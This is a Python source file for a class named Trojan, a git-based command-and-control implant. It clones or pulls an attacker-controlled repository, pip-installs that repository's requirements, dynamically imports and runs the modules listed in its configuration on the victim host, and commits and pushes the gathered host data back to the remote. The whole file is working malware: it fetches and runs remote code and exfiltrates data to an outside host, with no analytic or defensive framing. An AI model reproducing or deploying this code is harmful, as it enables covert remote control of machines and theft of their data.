import importlib
import json
import os
import subprocess
import sys
from datetime import datetime

from git import Repo

from host import Host


class Trojan:
    """This class is used to represent the trojan"""
    def __init__(self, repolink: str) -> None:
        self.current_host = None
        self.repo = self.get_repo(repolink)

    def get_module(self, module_name: str) -> object:
        """Returns an instance of module_name class which is searched in modules directory"""
        current_module = importlib.import_module(f"repo.modules.{module_name}")
        class_ = getattr(current_module, module_name)
        return class_(self.current_host)

    def run_modules(self) -> None:
        """Runs all the modules specified in the configuration"""
        self.current_host = Host()

        for module_to_run in self.current_host.configuration["modules"]:
            module = self.get_module(module_to_run)
            module.run()

            if module_to_run not in self.current_host.data:
                self.current_host.data[module_to_run] = module.log()
            else:
                for new_data in module.log():
                    if new_data not in self.current_host.data[module_to_run]:
                        self.current_host.data[module_to_run].append(new_data)

            del module
            sys.modules.pop(f"repo.modules.{module_to_run}")

    def handle_results(self) -> None:
        """Writes the results of the modules to a file and commits them to the repository"""
        with open(os.path.join("repo", "data", f"{self.current_host.hostname}.json"), "w") as outfile:
            outfile.write(json.dumps(self.current_host.__dict__, indent=2))

        self.repo.git.add("data")
        timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        self.repo.git.commit("-m", f"Results for {self.current_host.hostname} on {timestamp}")
        self.repo.git.push()

    def install_requirements(self) -> None:
        """Install the requirements for the modules"""
        requirements_file = os.path.join(os.getcwd(), "repo", "requirements.txt")
        subprocess.run(["pip3", "install", "-qr", requirements_file])

    def get_repo(self, repolink: str) -> Repo:
        """Returns the repository"""
        if not os.path.exists("repo"):
            return Repo.clone_from(repolink, "repo")
        else:
            return Repo("repo")

    def update_repo(self) -> None:
        """Initialzes or updates the repository"""
        self.repo.remotes.origin.pull()
        self.install_requirements()
